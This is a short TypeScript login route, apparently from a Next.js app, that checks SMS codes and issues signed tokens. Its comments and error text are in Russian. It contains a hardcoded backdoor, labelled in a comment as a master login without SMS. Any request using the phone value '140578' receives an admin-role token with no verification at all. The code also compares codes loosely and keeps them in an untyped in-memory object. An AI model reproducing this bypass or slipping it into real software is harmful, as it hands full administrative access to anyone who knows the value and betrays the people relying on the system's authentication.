import { sign } from "@/lib/auth";

let codes: any = {};

export async function POST(req: Request) {
  const { phone, code } = await req.json();

  // 🔑 мастер-вход без SMS
  if (phone === "140578") {
    const token = sign({
      phone: "admin",
      role: "admin"
    });

    return Response.json({ token });
  }

  if (codes[phone] != code) {
    return Response.json({ error: "Неверный код" }, { status: 400 });
  }

  const token = sign({ phone });

  return Response.json({ token });
      }
